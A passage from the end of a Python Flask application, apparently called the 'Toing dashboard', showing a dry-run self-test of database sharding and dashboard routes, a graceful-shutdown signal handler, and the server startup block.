    chunk, rem = divmod(len(links), n)
    total = 0
    curr = 0
    for i in range(n):
        end = curr + chunk + (1 if i < rem else 0) - 1
        total += end - curr + 1
        curr = end + 1
    assert total == len(links)
    log("Sharding: 23 DBs into 7 instances covers all 23")

    c = app.test_client()
    for path in ("/", "/logs", "/hits", "/firebases", "/settings", "/health"):
        r = c.get(path)
        assert r.status_code == 200 and len(r.data) > 0, path
    log("All dashboard routes OK")
    log("=== DRY RUN PASSED ===")


def request_shutdown(signum=None, frame=None):
    log("Shutdown signal received - stopping workers")
    stop_all(clear=False)
    for t in list(ACTIVE_THREADS.values()):
        try:
            t.join(timeout=2)
        except Exception:
            pass


if __name__ == "__main__":
    if "--dry-run" in sys.argv:
        dry_run()
    else:
        port = int(os.environ.get("PORT", "5004"))
        log("Toing dashboard starting on port %d (data dir %s)" % (port, DATA_DIR))
        try:
            signal.signal(signal.SIGTERM, request_shutdown)
            signal.signal(signal.SIGINT, request_shutdown)
        except ValueError:
            pass  # not on the main thread
        app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)
